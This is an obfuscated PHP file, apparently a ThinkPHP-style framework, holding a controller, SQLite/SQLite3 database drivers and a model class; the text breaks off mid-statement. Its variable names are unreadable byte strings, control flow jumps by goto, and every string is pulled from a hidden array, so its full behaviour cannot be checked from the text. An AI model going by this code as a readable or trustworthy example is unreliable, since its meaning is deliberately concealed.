<?php
 goto eÜ…ò—Á¤; CÚ™ï‹: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Ğ™’šï’ =& $_SERVER[ùÆÎÔ“Ñ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Ğ™’šï’[6]] =& $config; $this->values[$Ğ™’šï’[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Ğ™’šï’[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ãµî‹¬) { if (1 === func_num_args()) { $this->{$Ãµî‹¬} = new $Ãµî‹¬(); } else { $ª…ä˜Á¸ = new ReflectionClass($Ãµî‹¬); $Íş€“öÜ = func_get_args(); array_shift($Íş€“öÜ); $this->{$Ãµî‹¬} = $ª…ä˜Á¸->newInstanceArgs($Íş€“öÜ); } return $this->{$Ãµî‹¬}; } public function routeBind($ÏÛ¹èôĞ, $–¿´òê°, $™×Àß = 3) { $Ş‰ÅĞ®’ =& $_SERVER[ùÆÎÔ“Ñ]; $íÔ™¼‹Ş = $this->in[$Ş‰ÅĞ®’[9]]; $ÏÛ¹èôĞ = str_replace($Ş‰ÅĞ®’[10], $Ş‰ÅĞ®’[11], trim(trim($ÏÛ¹èôĞ, $Ş‰ÅĞ®’[8]), $Ş‰ÅĞ®’[12])); if (!$ÏÛ¹èôĞ || count($íÔ™¼‹Ş) <= $™×Àß) { return !1; } $¶ç´×¶¢ = !0; $Œ‚½¨Ò° = explode($Ş‰ÅĞ®’[8], $ÏÛ¹èôĞ); for ($ïñ­µŸ = 0; $ïñ­µŸ < count($Œ‚½¨Ò°); $ïñ­µŸ++) { if ($Œ‚½¨Ò°[$ïñ­µŸ] != $íÔ™¼‹Ş[$™×Àß + $ïñ­µŸ]) { $¶ç´×¶¢ = !1; break; } } if (!$¶ç´×¶¢) { return; } call_user_func_array(array($this, $–¿´òê°), array()); } public function routeArgs($†¨›ÛÚÇ = 3) { $‰øâ¸òí = $this->in[$_SERVER[ùÆÎÔ“Ñ][9]]; if (count($‰øâ¸òí) <= $†¨›ÛÚÇ) { return array(); } $åô¡Ñæñ = array(); for ($ŞĞšÄÉñ = $†¨›ÛÚÇ; $ŞĞšÄÉñ < count($‰øâ¸òí); $ŞĞšÄÉñ += 2) { $åô¡Ñæñ[$‰øâ¸òí[$ŞĞšÄÉñ]] = $‰øâ¸òí[$ŞĞšÄÉñ + 1]; $this->in[$‰øâ¸òí[$ŞĞšÄÉñ]] = $‰øâ¸òí[$ŞĞšÄÉñ + 1]; } return $åô¡Ñæñ; } protected function assign($Ï¥×ˆ¾ì, $Èç­œ÷) { $this->values[$Ï¥×ˆ¾ì] = $Èç­œ÷; } protected function display($ÇÌö°) { ob_end_clean(); extract($this->values); require $this->tpl . $ÇÌö°; } } class DbSqliteBase extends Db { public function __construct($„°òŸ¢Á = '') { $¯ºÈ‡¶ç =& $_SERVER[ùÆÎÔ“Ñ]; if (!extension_loaded($¯ºÈ‡¶ç[13])) { think_exception(think_lang($¯ºÈ‡¶ç[14]) . $¯ºÈ‡¶ç[15]); } if (!empty($„°òŸ¢Á)) { if (!isset($„°òŸ¢Á[$¯ºÈ‡¶ç[16]])) { $„°òŸ¢Á[$¯ºÈ‡¶ç[16]] = 438; } $this->config = $„°òŸ¢Á; if (empty($this->config[$¯ºÈ‡¶ç[17]])) { $this->config[$¯ºÈ‡¶ç[17]] = array(); } } } public function connect($Í·Ì§ä” = '', $ˆ¸’áş = 0) { $û‘‰Õ¹ =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($this->linkID[$ˆ¸’áş])) { if (empty($Í·Ì§ä”)) { $Í·Ì§ä” = $this->config; } $­³Ü³˜® = !empty($Í·Ì§ä”[$û‘‰Õ¹[17]][$û‘‰Õ¹[18]]) ? $Í·Ì§ä”[$û‘‰Õ¹[17]][$û‘‰Õ¹[18]] : $this->pconnect; $è¸É»î± = $­³Ü³˜® ? $û‘‰Õ¹[19] : $û‘‰Õ¹[20]; $this->linkID[$ˆ¸’áş] = $è¸É»î±($Í·Ì§ä”[$û‘‰Õ¹[21]], $Í·Ì§ä”[$û‘‰Õ¹[16]]); if (!$this->linkID[$ˆ¸’áş]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ˆ¸’áş], 30000); if (1 != think_config($û‘‰Õ¹[22])) { unset($this->config); } } return $this->linkID[$ˆ¸’áş]; } public function free() { $this->queryID = null; } public function query($°ò³Èî) { $şÂš»³ =& $_SERVER[ùÆÎÔ“Ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $°ò³Èî; if ($this->queryID) { $this->free(); } think_action_status($şÂš»³[23], 1); think_status($şÂš»³[24]); $this->queryID = sqlite_query($this->_linkID, $°ò³Èî); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Í´êéğ = $this->getAll(); return $Í´êéğ; } } public function execute($²¸‚˜²) { $óùì²ŒÜ =& $_SERVER[ùÆÎÔ“Ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $²¸‚˜²; if ($this->queryID) { $this->free(); } think_action_status($óùì²ŒÜ[25], 1); think_status($óùì²ŒÜ[24]); $÷­®‰­ = sqlite_exec($this->_linkID, $²¸‚˜²); $this->debug(); if (!1 === $÷­®‰­) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ùÆÎÔ“Ñ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÅàÁçÖ÷ = sqlite_query($this->_linkID, $_SERVER[ùÆÎÔ“Ñ][27]); if (!$ÅàÁçÖ÷) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¬àşÈË¸ = sqlite_query($this->_linkID, $_SERVER[ùÆÎÔ“Ñ][28]); if (!$¬àşÈË¸) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¢ı„Ò• = array(); if ($this->numRows > 0) { for ($ğ¥ã° = 0; $ğ¥ã° < $this->numRows; $ğ¥ã°++) { $¢ı„Ò•[$ğ¥ã°] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¢ı„Ò•; } public function getFields($¥°Ô®ºÆ) { $ ˜Ö£‚Â =& $_SERVER[ùÆÎÔ“Ñ]; $¦®Ò¿×¸ = $this->query($ ˜Ö£‚Â[29] . $¥°Ô®ºÆ . $ ˜Ö£‚Â[30]); $÷½™¬ŠÄ = array(); if ($¦®Ò¿×¸) { foreach ($¦®Ò¿×¸ as $‘ë³º¿Ï => $’¸ÉŞ§) { $÷½™¬ŠÄ[$’¸ÉŞ§[$ ˜Ö£‚Â[31]]] = array($ ˜Ö£‚Â[32] => $’¸ÉŞ§[$ ˜Ö£‚Â[31]], $ ˜Ö£‚Â[33] => $’¸ÉŞ§[$ ˜Ö£‚Â[34]], $ ˜Ö£‚Â[35] => (bool) ($’¸ÉŞ§[$ ˜Ö£‚Â[36]] === $ ˜Ö£‚Â[12]), $ ˜Ö£‚Â[37] => $’¸ÉŞ§[$ ˜Ö£‚Â[38]], $ ˜Ö£‚Â[39] => strtolower($’¸ÉŞ§[$ ˜Ö£‚Â[40]]) == $ ˜Ö£‚Â[41], $ ˜Ö£‚Â[42] => strtolower($’¸ÉŞ§[$ ˜Ö£‚Â[43]]) == $ ˜Ö£‚Â[44]); } } return $÷½™¬ŠÄ; } public function getTables($ÓÍ³¹” = '') { $ÓÇ‰ò‡Í =& $_SERVER[ùÆÎÔ“Ñ]; $—’“ª‡µ = $this->query($ÓÇ‰ò‡Í[45] . $ÓÇ‰ò‡Í[46] . $ÓÇ‰ò‡Í[47]); $Š±’Àââ = array(); foreach ($—’“ª‡µ as $ÀÛ¦’¸™ => $ÂóïŸ’) { $Š±’Àââ[$ÀÛ¦’¸™] = current($ÂóïŸ’); } return $Š±’Àââ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $·èû‹Òé =& $_SERVER[ùÆÎÔ“Ñ]; $Íá©„ŒÏ = sqlite_last_error($this->_linkID); $this->error = $Íá©„ŒÏ . $·èû‹Òé[4] . sqlite_error_string($Íá©„ŒÏ); if ($·èû‹Òé[12] != $this->queryStr) { $this->error .= LNG($·èû‹Òé[48]) . $this->queryStr; } think_trace($this->error, $·èû‹Òé[12], $·èû‹Òé[49]); return $this->error; } public function escapeString($¯Îš¿ÄÅ) { return sqlite_escape_string($¯Îš¿ÄÅ); } public function parseLimit($Ùúğã¬¥) { $Å—”à•Õ =& $_SERVER[ùÆÎÔ“Ñ]; $±ì©Îë = $Å—”à•Õ[12]; if (!empty($Ùúğã¬¥)) { $Ùúğã¬¥ = explode($Å—”à•Õ[50], $Ùúğã¬¥); if (count($Ùúğã¬¥) > 1) { $±ì©Îë .= $Å—”à•Õ[51] . $Ùúğã¬¥[1] . $Å—”à•Õ[52] . $Ùúğã¬¥[0] . $Å—”à•Õ[53]; } else { $±ì©Îë .= $Å—”à•Õ[51] . $Ùúğã¬¥[0] . $Å—”à•Õ[53]; } } return $±ì©Îë; } } class DbSqlite3Base extends Db { public function __construct($™‰…ı€Ø = '') { $åø¶ÕË“ =& $_SERVER[ùÆÎÔ“Ñ]; if (!class_exists($åø¶ÕË“[54])) { think_exception(think_lang($åø¶ÕË“[14]) . $åø¶ÕË“[55]); } if (!empty($™‰…ı€Ø)) { if (!isset($™‰…ı€Ø[$åø¶ÕË“[16]])) { $™‰…ı€Ø[$åø¶ÕË“[16]] = 438; } $this->config = $™‰…ı€Ø; if (empty($this->config[$åø¶ÕË“[17]])) { $this->config[$åø¶ÕË“[17]] = array(); } } } public function connect($Ğ€ş¹¼ó = '', $é·€ú¢¯ = 0) { $â×ğ˜ä =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($this->linkID[$é·€ú¢¯])) { if (empty($Ğ€ş¹¼ó)) { $Ğ€ş¹¼ó = $this->config; } $this->linkID[$é·€ú¢¯] = new SQLite3($Ğ€ş¹¼ó[$â×ğ˜ä[21]]); if (!$this->linkID[$é·€ú¢¯]) { think_exception($this->linkID[$é·€ú¢¯]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$é·€ú¢¯]->busyTimeout(30000); if (1 != think_config($â×ğ˜ä[22])) { unset($this->config); } } return $this->linkID[$é·€ú¢¯]; } public function free() { $this->queryID = null; } public function query($ÁÏ¥±É¡) { $çµüŸØÎ =& $_SERVER[ùÆÎÔ“Ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÁÏ¥±É¡; if ($this->queryID) { $this->free(); } think_action_status($çµüŸØÎ[23], 1); think_status($çµüŸØÎ[24]); $this->queryID = $this->_linkID->query($ÁÏ¥±É¡); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¾îşµ‚ = $this->getAll(); $this->numRows = count($¾îşµ‚); return $¾îşµ‚; } } public function execute($ŒÊä’„À) { $ı®«ÚŒÛ =& $_SERVER[ùÆÎÔ“Ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ŒÊä’„À; if ($this->queryID) { $this->free(); } think_action_status($ı®«ÚŒÛ[25], 1); think_status($ı®«ÚŒÛ[24]); $š¼±¿ö = $this->_linkID->exec($ŒÊä’„À); $this->debug(); if (!1 === $š¼±¿ö) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ùÆÎÔ“Ñ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ëùä·ÒÔ = $this->_linkID->query($_SERVER[ùÆÎÔ“Ñ][27]); if (!$ëùä·ÒÔ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¡âåãÎÇ = $this->_linkID->query($_SERVER[ùÆÎÔ“Ñ][28]); if (!$¡âåãÎÇ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Úü¾Ã»§ = array(); while ($ÕßèÔ‡Ù = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Úü¾Ã»§[] = $ÕßèÔ‡Ù; } $this->queryID->reset(); return $Úü¾Ã»§; } public function getFields($÷«‘‚àá) { $šóéÏ›ñ =& $_SERVER[ùÆÎÔ“Ñ]; $‚É‹µ«Ï = $this->query($šóéÏ›ñ[29] . $÷«‘‚àá . $šóéÏ›ñ[30]); $½—ù£—ˆ = array(); if ($‚É‹µ«Ï) { foreach ($‚É‹µ«Ï as $Ñ®„àÊ¯ => $õ·ƒ¤ÒÚ) { $½—ù£—ˆ[$õ·ƒ¤ÒÚ[$šóéÏ›ñ[32]]] = array($šóéÏ›ñ[32] => $õ·ƒ¤ÒÚ[$šóéÏ›ñ[32]], $šóéÏ›ñ[33] => $õ·ƒ¤ÒÚ[$šóéÏ›ñ[33]], $šóéÏ›ñ[35] => (bool) ($õ·ƒ¤ÒÚ[$šóéÏ›ñ[35]] === $šóéÏ›ñ[12]), $šóéÏ›ñ[37] => $õ·ƒ¤ÒÚ[$šóéÏ›ñ[56]], $šóéÏ›ñ[39] => (bool) $õ·ƒ¤ÒÚ[$šóéÏ›ñ[57]], $šóéÏ›ñ[42] => (bool) $õ·ƒ¤ÒÚ[$šóéÏ›ñ[57]]); } } return $½—ù£—ˆ; } public function getTables($Å°…×êÊ = '') { $ïåô„“ê =& $_SERVER[ùÆÎÔ“Ñ]; $ÏÃ—ñ¤’ = $this->query($ïåô„“ê[45] . $ïåô„“ê[46] . $ïåô„“ê[47]); $•­ÄÈ¼Ó = array(); foreach ($ÏÃ—ñ¤’ as $¸ëöáÚ… => $ÛŒºï ) { $•­ÄÈ¼Ó[$¸ëöáÚ…] = current($ÛŒºï ); } return $•­ÄÈ¼Ó; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¡öª…Üì =& $_SERVER[ùÆÎÔ“Ñ]; $this->error = $this->_linkID->lastErrorMsg(); if ($¡öª…Üì[12] != $this->queryStr) { $this->error .= LNG($¡öª…Üì[48]) . $this->queryStr; } think_trace($this->error, $¡öª…Üì[12], $¡öª…Üì[49]); return $this->error; } public function escapeString($ÄşÎæÇß) { $€—›š¼± =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->_linkID) { return $this->_linkID->escapeString($ÄşÎæÇß); } return str_ireplace($€—›š¼±[58], $€—›š¼±[59], $ÄşÎæÇß); } public function parseLimit($îÔÆ€è) { $ä»´Ï¬¿ =& $_SERVER[ùÆÎÔ“Ñ]; $Èò÷®³Œ = $ä»´Ï¬¿[12]; if (!empty($îÔÆ€è)) { $îÔÆ€è = explode($ä»´Ï¬¿[50], $îÔÆ€è); if (count($îÔÆ€è) > 1) { $Èò÷®³Œ .= $ä»´Ï¬¿[51] . $îÔÆ€è[1] . $ä»´Ï¬¿[52] . $îÔÆ€è[0] . $ä»´Ï¬¿[53]; } else { $Èò÷®³Œ .= $ä»´Ï¬¿[51] . $îÔÆ€è[0] . $ä»´Ï¬¿[53]; } } return $Èò÷®³Œ; } } goto AŒÙºÑŒªĞ; BÚËñ´Ã“: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\x6f\162\x64\x65\162", "\x61\x6c\x69\x61\163", "\150\141\166\151\156\x67", "\147\162\157\165\160", "\x6c\157\x63\x6b", "\144\151\x73\164\x69\156\143\164", "\141\165\x74\x6f", "\146\151\154\x74\x65\x72", "\166\x61\154\x69\x64\x61\164\145", "\162\145\x73\x75\x6c\164", "\x62\151\156\x64", "\x74\157\153\145\x6e"); public function __construct($›¬—»Ì = '', $ïÄˆ·×É = '', $¼ÊØ˜—ğ = '') { $«ë²Š‹â =& $_SERVER[ùÆÎÔ“Ñ]; $this->_initialize(); if (!empty($›¬—»Ì)) { if (strpos($›¬—»Ì, $«ë²Š‹â[10])) { list($this->dbName, $this->name) = explode($«ë²Š‹â[10], $›¬—»Ì); } else { $this->name = $›¬—»Ì; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ïÄˆ·×É)) { $this->tablePrefix = $«ë²Š‹â[12]; } elseif ($«ë²Š‹â[12] != $ïÄˆ·×É) { $this->tablePrefix = $ïÄˆ·×É; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($«ë²Š‹â[244]); } $this->db(0, empty($this->connection) ? $¼ÊØ˜—ğ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $‡ÚÇ´½ä =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($this->fields)) { if (think_config($‡ÚÇ´½ä[245])) { $Â‘™’®ş = $this->dbName ? $this->dbName : think_config($‡ÚÇ´½ä[246]); $¯úÁù  = think_var_cache($‡ÚÇ´½ä[247] . strtolower(get_path_this($Â‘™’®ş) . $‡ÚÇ´½ä[10] . $this->name)); if ($¯úÁù ) { $¡ß­•  = think_config($‡ÚÇ´½ä[248]); if (empty($¡ß­• ) || $¯úÁù [$‡ÚÇ´½ä[249]] == $¡ß­• ) { $this->fields = $¯úÁù ; return; } } } $this->flush(); } } public function flush() { $«²ìòÆ‹ =& $_SERVER[ùÆÎÔ“Ñ]; $this->db->setModel($this->name); $Å†×— = $this->db->getFields($this->getTableName()); if (!$Å†×—) { return !1; } $this->fields = array_keys($Å†×—); $this->fields[$«²ìòÆ‹[250]] = !1; foreach ($Å†×— as $©ìÄ‹É => $³Š‚£ğ) { $æ»ÔÏÒÊ[$©ìÄ‹É] = $³Š‚£ğ[$«²ìòÆ‹[33]]; if ($³Š‚£ğ[$«²ìòÆ‹[39]]) { $this->fields[$«²ìòÆ‹[251]] = $©ìÄ‹É; if ($³Š‚£ğ[$«²ìòÆ‹[42]]) { $this->fields[$«²ìòÆ‹[250]] = !0; } } } $this->fields[$«²ìòÆ‹[252]] = $æ»ÔÏÒÊ; if (think_config($«²ìòÆ‹[248])) { $this->fields[$«²ìòÆ‹[249]] = think_config($«²ìòÆ‹[248]); } if (think_config($«²ìòÆ‹[245])) { $ÛÛ¥‹İß = $this->dbName ? $this->dbName : think_config($«²ìòÆ‹[246]); think_var_cache($«²ìòÆ‹[247] . strtolower(get_path_this($ÛÛ¥‹İß) . $«²ìòÆ‹[10] . $this->name), $this->fields); } } public function switchModel($èÊÔ¬¶É, $ëŞÉ©—¶ = array()) { $´í¸àÕ =& $_SERVER[ùÆÎÔ“Ñ]; $±Ş™—‹Ÿ = ucwords(strtolower($èÊÔ¬¶É)) . $´í¸àÕ[253]; if (!class_exists($±Ş™—‹Ÿ)) { think_exception($±Ş™—‹Ÿ . think_lang($´í¸àÕ[254])); } $this->_extModel = new $±Ş™—‹Ÿ($this->name); if (!empty($ëŞÉ©—¶)) { foreach ($ëŞÉ©—¶ as $´Òˆ†±ˆ) { $this->_extModel->setProperty($´Òˆ†±ˆ, $this->{$´Òˆ†±ˆ}); } } return $this->_extModel; } public function __set($‹ÀûÜ‰Á, $ Ñ‹È“ˆ) { $this->data[$‹ÀûÜ‰Á] = $ Ñ‹È“ˆ; } public function __get($‹ëÀĞ€í) { return isset($this->data[$‹ëÀĞ€í]) ? $this->data[$‹ëÀĞ€í] : null; } public function __isset($¤óÚ¸˜) { return isset($this->data[$¤óÚ¸˜]); } public function __unset($­˜ì„´) { unset($this->data[$­˜ì„´]); } public function __call($ó»Ãå¿‘, $“¢Åµ¿) { $Õ¼¬ş =& $_SERVER[ùÆÎÔ“Ñ]; if (in_array(strtolower($ó»Ãå¿‘), $this->methods, !0)) { $this->options[strtolower($ó»Ãå¿‘)] = $“¢Åµ¿[0]; return $this; } elseif (in_array(strtolower($ó»Ãå¿‘), array($Õ¼¬ş[255], $Õ¼¬ş[256], $Õ¼¬ş[257], $Õ¼¬ş[258], $Õ¼¬ş[259]), !0)) { $Ñ¬†Â“² = isset($“¢Åµ¿[0]) ? $“¢Åµ¿[0] : $Õ¼¬ş[188]; $Ñ¬†Â“² = $this->db->parseKey($Ñ¬†Â“²); return $this->getField(strtoupper($ó»Ãå¿‘) . $Õ¼¬ş[260] . $Ñ¬†Â“² . $Õ¼¬ş[261] . $ó»Ãå¿‘, $Õ¼¬ş[255]); } elseif (strtolower(substr($ó»Ãå¿‘, 0, 5)) == $Õ¼¬ş[262]) { $Ñ¬†Â“² = think_parse_name(substr($ó»Ãå¿‘, 5)); $ ğ¥¦ÆÀ[$Ñ¬†Â“²] = $“¢Åµ¿[0]; return $this->where($ ğ¥¦ÆÀ)->find(); } elseif (strtolower(substr($ó»Ãå¿‘, 0, 10)) == $Õ¼¬ş[263]) { $ÄÂ»Ä¡† = think_parse_name(substr($ó»Ãå¿‘, 10)); $ ğ¥¦ÆÀ[$ÄÂ»Ä¡†] = $“¢Åµ¿[0]; return $this->where($ ğ¥¦ÆÀ)->getField($“¢Åµ¿[1]); } elseif (isset($this->_scope[$ó»Ãå¿‘])) { return $this->scope($ó»Ãå¿‘, $“¢Åµ¿[0]); } elseif (method_exists($this, $ó»Ãå¿‘)) { array_unshift($“¢Åµ¿, $ó»Ãå¿‘); return call_user_func_array(array($this, $Õ¼¬ş[264]), $“¢Åµ¿); } else { return call_user_func_array(array(parent, $ó»Ãå¿‘), $“¢Åµ¿); } } protected function call() { $úÏÂ™ =& $_SERVER[ùÆÎÔ“Ñ]; $„¹Ë‹³ = func_get_args(); $ü¦èÂŠª = array_shift($„¹Ë‹³); $Ğ¢àôÚ = $ü¦èÂŠª; if (is_array($ü¦èÂŠª)) { $Ğ¢àôÚ = $ü¦èÂŠª[1]; $ü¦èÂŠª = $ü¦èÂŠª[0]; } $²™Ù¹ÎÀ = count($„¹Ë‹³) - 1; if (isset($„¹Ë‹³[$²™Ù¹ÎÀ]) && $„¹Ë‹³[$²™Ù¹ÎÀ] === $ü¦èÂŠª) { think_exception(__CLASS__ . $úÏÂ™[4] . $ü¦èÂŠª . think_lang($úÏÂ™[265])); return; } $„¹Ë‹³[] = $ü¦èÂŠª; if (method_exists($this, $úÏÂ™[266])) { $¬Õ“Ô  = call_user_func_array(array($this, $úÏÂ™[267]), array($Ğ¢àôÚ, $„¹Ë‹³)); if (!is_null($¬Õ“Ô ) && $¬Õ“Ô  !== !1) { return $¬Õ“Ô ; } } $ãšçªÕŠ = call_user_func_array(array($this, $ü¦èÂŠª), $„¹Ë‹³); if (method_exists($this, $úÏÂ™[268])) { $¬Õ“Ô  = call_user_func_array(array($this, $úÏÂ™[269]), array($Ğ¢àôÚ, $„¹Ë‹³, $ãšçªÕŠ)); if ($¬Õ“Ô ) { return $¬Õ“Ô ; } } return $ãšçªÕŠ; } protected function _initialize() { } protected function _facade($‚ÎÉô¤‰) { $°è¿«§Ö =& $_SERVER[ùÆÎÔ“Ñ]; if (!empty($this->fields)) { foreach ($‚ÎÉô¤‰ as $ÉÀá©ı => $Ì”¥¸‹) { if (is_array($this->fields) && !in_array($ÉÀá©ı, $this->fields, !0)) { unset($‚ÎÉô¤‰[$ÉÀá©ı]); } elseif (is_scalar($Ì”¥¸‹)) { $this->_parseType($‚ÎÉô¤‰, $ÉÀá©ı); } } } if (!empty($this->options[$°è¿«§Ö[270]])) { $‚ÎÉô¤‰ = array_map($this->options[$°è¿«§Ö[270]], $‚ÎÉô¤‰); unset($this->options[$°è¿«§Ö[270]]); } $this->_beforeWrite($‚ÎÉô¤‰); return $‚ÎÉô¤‰; } protected function _beforeWrite(&$í§Ë®Ò‡) { } public function add($ Ùö¿Ì = '', $ï®‹ş = array(), $µÃÔÙí„ = false) { if (empty($ Ùö¿Ì)) { if (!empty($this->data)) { $ Ùö¿Ì = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ùÆÎÔ“Ñ][271]); return !1; } } $ï®‹ş = $this->_parseOptions($ï®‹ş); $ Ùö¿Ì = $this->_facade($ Ùö¿Ì); if (!1 === $this->_beforeInsert($ Ùö¿Ì, $ï®‹ş)) { return !1; } $úçé = $this->db->insert($ Ùö¿Ì, $ï®‹ş, $µÃÔÙí„); if (!1 !== $úçé) { $ˆíæÎ› = $this->getLastInsID(); if ($ˆíæÎ›) { $ Ùö¿Ì[$this->getPk()] = $ˆíæÎ›; $this->_after_insert($ Ùö¿Ì, $ï®‹ş); return $ˆíæÎ›; } $this->_after_insert($ Ùö¿Ì, $ï®‹ş); } return $úçé; } protected function _beforeInsert(&$„‡š›­, $¤¢½×èÒ) { } protected function _after_insert($ÍßßğĞÍ, $ï¸êüÆ) { } public function addAll($óÛœ‹‚ƒ, $ñèĞôÃ§ = array(), $”îú¸²å = false) { $èÕù÷ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($óÛœ‹‚ƒ)) { $this->error = think_lang($èÕù÷[271]); return !1; } $ñèĞôÃ§ = $this->_parseOptions($ñèĞôÃ§); foreach ($óÛœ‹‚ƒ as $†Öæ™ => $¶šåƒÜ) { $óÛœ‹‚ƒ[$†Öæ™] = $this->_facade($¶šåƒÜ); } if (method_exists($this->db, $èÕù÷[272])) { $¤•ğæø = $this->db->insertAll($óÛœ‹‚ƒ, $ñèĞôÃ§, $”îú¸²å); } else { $this->startTrans(); foreach ($óÛœ‹‚ƒ as $†Öæ™ => $¶šåƒÜ) { $¤•ğæø = $this->db->insert($¶šåƒÜ, $ñèĞôÃ§, $”îú¸²å); } $this->commit(); } if (!1 !== $¤•ğæø) { $ß¾¬¹òø = $this->getLastInsID(); if ($ß¾¬¹òø) { return $ß¾¬¹òø; } } return $¤•ğæø; } public function selectAdd($ÁûÄ¢± = '', $„å’Ø»® = '', $Ö©†Ä£ = array()) { $ùüåà˜ô =& $_SERVER[ùÆÎÔ“Ñ]; $Ö©†Ä£ = $this->_parseOptions($Ö©†Ä£); if (!1 === ($ø¨×É¾Æ = $this->db->selectInsert($ÁûÄ¢± ? $ÁûÄ¢± : $Ö©†Ä£[$ùüåà˜ô[273]], $„å’Ø»® ? $„å’Ø»® : $this->getTableName(), $Ö©†Ä£))) { $this->error = think_lang($ùüåà˜ô[274]); return !1; } else { return $ø¨×É¾Æ; } } public function save($´ø›ñµ = '', $Ÿ¸ÌÊØ = array()) { $õúĞÈ¦¢ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($´ø›ñµ)) { if (!empty($this->data)) { $´ø›ñµ = $this->data; $this->data = array(); } else { $this->error = think_lang($õúĞÈ¦¢[271]); return !1; } } $´ø›ñµ = $this->_facade($´ø›ñµ); $Ÿ¸ÌÊØ = $this->_parseOptions($Ÿ¸ÌÊØ); $øª§¾ú = $this->getPk(); if (!isset($Ÿ¸ÌÊØ[$õúĞÈ¦¢[275]])) { if (isset($´ø›ñµ[$øª§¾ú])) { $¥óêéÎÁ[$øª§¾ú] = $´ø›ñµ[$øª§¾ú]; $Ÿ¸ÌÊØ[$õúĞÈ¦¢[275]] = $¥óêéÎÁ; unset($´ø›ñµ[$øª§¾ú]); } else { $this->error = think_lang($õúĞÈ¦¢[274]); return !1; } } if (is_array($Ÿ¸ÌÊØ[$õúĞÈ¦¢[275]]) && isset($Ÿ¸ÌÊØ[$õúĞÈ¦¢[275]][$øª§¾ú])) { $Â•“ Ê = $Ÿ¸ÌÊØ[$õúĞÈ¦¢[275]][$øª§¾ú]; } if (!1 === $this->_beforeUpdate($´ø›ñµ, $Ÿ¸ÌÊØ)) { return !1; } $ñ˜¶Îˆ¬ = $this->db->update($´ø›ñµ, $Ÿ¸ÌÊØ); if (!1 !== $ñ˜¶Îˆ¬) { if (isset($Â•“ Ê)) { $´ø›ñµ[$øª§¾ú] = $Â•“ Ê; } $this->_afterUpdate($´ø›ñµ, $Ÿ¸ÌÊØ); } return $ñ˜¶Îˆ¬; } protected function _beforeUpdate(&$ÖıïŠ…Ş, $ƒÛâ—Óñ) { } protected function _afterUpdate($·ØÈ®Í, $©ƒëö§) { } public function delete($Ëùç©ğ = array()) { $µ„í¼¾„ =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($Ëùç©ğ) && empty($this->options[$µ„í¼¾„[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¶§ºÍÒÊ = $this->getPk(); if (is_numeric($Ëùç©ğ) || is_string($Ëùç©ğ)) { if (strpos($Ëùç©ğ, $µ„í¼¾„[50])) { $¸â„ìº[$¶§ºÍÒÊ] = array($µ„í¼¾„[276], $Ëùç©ğ); } else { $¸â„ìº[$¶§ºÍÒÊ] = $Ëùç©ğ; } $this->options[$µ„í¼¾„[275]] = $¸â„ìº; } $Ëùç©ğ = $this->_parseOptions(); if (is_array($Ëùç©ğ[$µ„í¼¾„[275]]) && isset($Ëùç©ğ[$µ„í¼¾„[275]][$¶§ºÍÒÊ])) { $Œ–›æ¸ = $Ëùç©ğ[$µ„í¼¾„[275]][$¶§ºÍÒÊ]; } $ÛÔ˜¿Ó× = $this->db->delete($Ëùç©ğ); if (!1 !== $ÛÔ˜¿Ó×) { $ÔÌüä¬í = 